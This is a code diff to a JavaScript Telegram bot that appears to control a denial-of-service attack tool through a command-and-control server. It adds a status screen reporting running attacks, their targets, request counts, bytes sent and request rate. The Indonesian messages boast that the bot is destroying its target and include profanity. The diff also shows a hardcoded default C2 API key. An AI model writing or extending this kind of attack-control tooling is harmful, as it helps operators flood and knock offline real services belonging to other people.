@@ -4,6 +4,7 @@ import axios from 'axios';
 import { logger } from '../utils/logger.js';
 import { methodExecutor } from '../c2/method-executor.js';
 import crypto from 'crypto';
+import { REQUESTS_SENT, BYTES_SENT } from '../utils/counter.js';
 
 export class TelegramBotInline {
     constructor(token, adminIds, config) {
@@ -634,6 +635,40 @@ export class TelegramBotInline {
     }
 
     async showC2Status(ctx) {
+        const useLocalExecution = this.config.c2?.useLocalExecution !== false;
+        
+        // If using local execution, show local stats
+        if (useLocalExecution) {
+            const activeAttacks = methodExecutor.getActiveAttacks();
+            const totalRequests = REQUESTS_SENT.get();
+            const totalBytes = BYTES_SENT.get();
+            
+            ctx.reply(
+                `╔═══════════════════════════════╗\n` +
+                `║   📊 *STATUS BOT LOKAL* 📊   ║\n` +
+                `╚═══════════════════════════════╝\n\n` +
+                `⚡ *STATUS ATTACK*\n` +
+                `├─ Lagi Jalan: *${activeAttacks.length}* 🔥\n` +
+                `└─ Mode: *Local Execution*\n\n` +
+                `📈 *PERFORMA REAL-TIME*\n` +
+                `├─ Total Request: *${totalRequests.toLocaleString()}* 🚀\n` +
+                `├─ Total Bytes: *${(totalBytes / 1024 / 1024).toFixed(2)} MB*\n` +
+                `└─ Avg Speed: *${totalRequests > 0 ? Math.floor(totalRequests / 60) : 0} req/s*\n\n` +
+                `💡 *Active Attacks:*\n` +
+                (activeAttacks.length > 0 
+                    ? activeAttacks.slice(0, 3).map(a => 
+                        `• ${a.method} → ${a.target.substring(0, 30)}...`
+                    ).join('\n')
+                    : '• Tidak ada attack yang jalan\n') +
+                `\n\n────────────────────────\n` +
+                `⏰ Update: ${new Date().toLocaleTimeString('id-ID')}\n` +
+                `🔥 *BOT LAGI NGANCURIN TARGET!* 🔥`,
+                { parse_mode: 'Markdown', ...this.mainMenu() }
+            );
+            return;
+        }
+        
+        // Otherwise try C2 server
         const c2Url = this.config.c2?.url || 'http://localhost:8080';
         const apiKey = this.config.c2?.apiKey || 'aryzz-c2-api-key-2024';
 
@@ -676,7 +711,7 @@ export class TelegramBotInline {
             ctx.reply(
                 `❌ *C2 SERVER MATI KONTOL!*\n\n` +
                 `Error: ${error.message}\n\n` +
-                `Server nya lagi mati kali!`,
+                `Coba pake mode lokal aja!`,
                 { parse_mode: 'Markdown', ...this.mainMenu() }
             );
         }
